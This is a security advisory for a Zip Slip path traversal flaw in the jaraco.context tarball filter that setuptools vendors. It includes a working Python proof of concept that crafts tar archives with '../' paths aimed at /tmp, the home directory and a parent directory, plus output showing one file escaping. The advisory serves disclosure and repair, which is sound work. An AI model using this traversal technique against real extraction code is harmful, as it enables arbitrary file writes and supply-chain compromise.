# jaraco.context Has a Path Traversal Vulnerability

**GHSA**: GHSA-58pv-8j8x-9vj2 | **CVE**: CVE-2026-23949 | **Severity**: high (CVSS 8.6)

**CWE**: CWE-22

**Affected Packages**:
- **jaraco.context** (pip): >= 5.2.0, < 6.1.0

## Description

### Summary
There is a Zip Slip path traversal vulnerability in the jaraco.context package affecting setuptools as well, in `jaraco.context.tarball()` function. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed.
The strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`.
Note that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`.

The code can be found:
- https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91
- https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76 (inherited)

This report was also sent to setuptools maintainers and they asked some questions regarding this.

The lengthy answer is:

The vulnerability seems to be the `strip_first_component` filter function, not the tarball function itself and has the same behavior on any tested Python version locally (from 11 to 14, as I noticed that there is a backports conditional for the tarball).
The stock tarball for Python 3.12+ is considered not vulnerable (until proven otherwise 😄) but here the custom filter seems to overwrite the native filtering and introduces the issue - while overwriting the updated secure Python 3.12+ behavior and giving a false sense of sanitization.

The short answer is:

If we are talking about Python < 3.12 the tarball and jaraco implementations /  behaviors are relatively the same but for Python 3.12+ the jaraco implementation overwrites the native tarball protection.

Sampled tests:
<img width="1634" height="245" alt="image" src="https://github.com/user-attachments/assets/ce6c0de6-bb53-4c2b-818a-d77e28d2fbeb" />

### Details

The flow with setuptools in the mix:
```
setuptools._vendor.jaraco.context.tarball() > req = urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as tf: > tf.extractall(path=target_dir, filter=strip_first_component) > strip_first_component (Vulnerable)
```

### PoC

This was tested on multiple Python versions > 11 on a Debian GNU 12 (bookworm).
You can run this directly after having all the dependencies:
```py
#!/usr/bin/env python3
import tarfile
import io
import os
import sys
import shutil
import tempfile
from setuptools._vendor.jaraco.context import strip_first_component


def create_malicious_tarball(traversal_to_root: str):
    tar_data = io.BytesIO()
    with tarfile.open(fileobj=tar_data, mode='w') as tar:
        # Create a malicious file path with traversal sequences
        malicious_files = [
            # Attempt 1: Simple traversal to /tmp
            {
                'path': f'dummy_dir/{traversal_to_root}tmp/pwned_by_zipslip.txt',
                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',
                'name': 'pwned_via_tmp'
            },
            # Attempt 2: Try to write to home directory
            {
                'path': f'dummy_dir/{traversal_to_root}home/pwned_home.txt',
                'content': b'[ZIPSLIP] Attempted write to home directory',
                'name': 'pwned_via_home'
            },
            # Attempt 3: Try to write to current directory parent
            {
                'path': 'dummy_dir/../escaped.txt',
                'content': b'[ZIPSLIP] File in parent directory!',
                'name': 'pwned_escaped'
            },
            # Attempt 4: Legitimate file for comparison
            {
                'path': 'dummy_dir/legitimate_file.txt',
                'content': b'This file stays in target directory',
                'name': 'legitimate'
            }
        ]
        for file_info in malicious_files:
            content = file_info['content']
            tarinfo = tarfile.TarInfo(name=file_info['path'])
            tarinfo.size = len(content)
            tar.addfile(tarinfo, io.BytesIO(content))

    tar_data.seek(0)
    return tar_data


def exploit_zipslip():
    print(\"[*] Target: setuptools._vendor.jaraco.context.tarball()\")

    # Create temporary directory for extraction
    temp_base = tempfile.mkdtemp(prefix=\"zipslip_test_\")
    target_dir = os.path.join(temp_base, \"extraction_target\")

    try:
        os.mkdir(target_dir)
        print(f\"[+] Created target extraction directory: {target_dir}\")

        target_dir_abs = os.path.abspath(target_dir)
        print(target_dir_abs)
        depth_to_root = len([p for p in target_dir_abs.split(os.sep) if p])
        traversal_to_root = \"../\" * depth_to_root
        print(f\"[+] Using traversal_to_root prefix: {traversal_to_root!r}\")

        # Create malicious tarball
        print(\"[*] Creating malicious tar archive...\")
        tar_data = create_malicious_tarball(traversal_to_root)

        try:
            with tarfile.open(fileobj=tar_data, mode='r') as tf:
                for member in tf:
                    # Apply the ACTUAL vulnerable function from setuptools
                    processed_member = strip_first_component(member, target_dir)
                    print(f\"[*] Extracting: {member.name:40} -> {processed_member.name}\")

                    # Extract to target directory
                    try:
                        tf.extract(processed_member, path=target_dir)
                        print(f\"    ✓ Extracted successfully\")
                    except (PermissionError, FileNotFoundError, OSError) as e:
                        print(f\"    ! {type(e).__name__}: Path traversal ATTEMPTED\")
        except Exception as e:
            print(f\"[!] Extraction raised exception: {type(e).__name__}: {e}\")

        # Check results
        print(\"[*] Checking for extracted files...\")

        # Check target directory
        print(f\"[*] Files in target directory ({target_dir}):\")
        if os.path.exists(target_dir):
            for root, _, files in os.walk(target_dir):
                level = root.replace(target_dir, '').count(os.sep)
                indent = ' ' * 2 * level
                print(f\"{indent}{os.path.basename(root)}/\")
                subindent = ' ' * 2 * (level + 1)
                for file in files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()[:50]
                        print(f\"{subindent}{file}\")
                        print(f\"{subindent}  └─ {content}...\")
                    except:
                        print(f\"{subindent}{file} (binary)\")
        else:
            print(f\"[!] Target directory not found!\")

        print()
        print(\"[*] Checking for traversal attempts...\")
        print()

        # Check if files escaped
        traversal_attempts = [
            (\"/tmp/pwned_by_zipslip.txt\", \"Escape to /tmp\"),
            (os.path.expanduser(\"~/pwned_home.txt\"), \"Escape to home\"),
            (os.path.join(temp_base, \"escaped.txt\"), \"Escape to parent\"),
        ]

        escaped = False
        for check_path, description in traversal_attempts:
            if os.path.exists(check_path):
                print(f\"[+] Path Traversal Confirmed: {description}\")
                print(f\"      File created at: {check_path}\")
                try:
                    with open(check_path, 'r') as f:
                        content = f.read()
                    print(f\"      Content: {content}\")
                    print(f\"      Removing: {check_path}\")
                    os.remove(check_path)
                except Exception as e:
                    print(f\"      Error reading: {e}\")
                escaped = True
            else:
                print(f\"[-] OK: {description} - No escape detected\")

        if escaped:
            print(\"[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!\")
        else:
            print(\"[-] No path traversal detected (mitigation in place)\")

    finally:
        # Cleanup
        print()
        print(f\"[*] Cleaning up: {temp_base}\")
        try:
            shutil.rmtree(temp_base)
        except Exception as e:
            print(f\"[!] Cleanup error: {e}\")


def check_python_version():
    print(f\"[+] Python version: {sys.version}\")
    # Python 3.11.4+ added DEFAULT_FILTER
    if hasattr(tarfile, 'DEFAULT_FILTER'):
        print(\"[+] Python has DEFAULT_FILTER (tarfile security hardening)\")
    else:
        print(\"[!] Python does not have DEFAULT_FILTER (older version)\")
    print()


if __name__ == \"__main__\":
    check_python_version()
    exploit_zipslip()
```

Output:
```
[+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] 
[!] Python does not have DEFAULT_FILTER (older version) 

[*] Target: setuptools._vendor.jaraco.context.tarball() 
[+] Created target extraction directory: /tmp/zipslip_test_tnu3qpd5/extraction_target 
[*] Creating malicious tar archive... 
[*] Extracting: ../../tmp/pwned_by_zipslip.txt           -> ../../tmp/pwned_by_zipslip.txt 
    ✓ Extracted successfully 
[*] Extracting: ../../../../home/pwned_home.txt          -> ../../../../home/pwned_home.txt 
    ! PermissionError: Path traversal ATTEMPTED 
[*] Extracting: ../escaped.txt                           -> ../escaped.txt 
    ✓ Extracted successfully 
[*] Extracting: legitimate_file.txt                      -> legitimate_file.txt 
    ✓ Extracted successfully 
[*] Checking for extracted files... 
[*] Files in target directory (/tmp/zipslip_test_tnu3qpd5/extraction_target): 
extraction_target/ 
  legitimate_file.txt 
    └─ This file stays in target directory... 

[*] Checking for traversal attempts... 

[-] OK: Escape to /tmp - No escape detected 
[-] OK: Escape to home - No escape detected 
[+] Path Traversal Confirmed: Escape to parent 
      File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
      Content: [ZIPSLIP] File in parent directory! 
      Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed! 

[*] Cleaning up: /tmp/zipslip_test_tnu3qpd5
```

### Impact

- Arbitrary file creation in filesystem (HIGH exploitability) - especially if popular packages download tar files remotely and use this package to extract files.
- Privesc (LOW exploitability)
- Supply-Chain attack (VARIABLE exploitability) - relevant to the first point.

### Remediation

I guess removing the custom filter is not feasible given the backward compatibility issues that might come up you can use a safer filter `strip_first_component` that skips or sanitizes `../` character sequences since it is already there eg.
```
if member.name.startswith('/') or '..' in member.name:
  raise ValueError(f\"Attempted path traversal detected: {member.name}\")
```
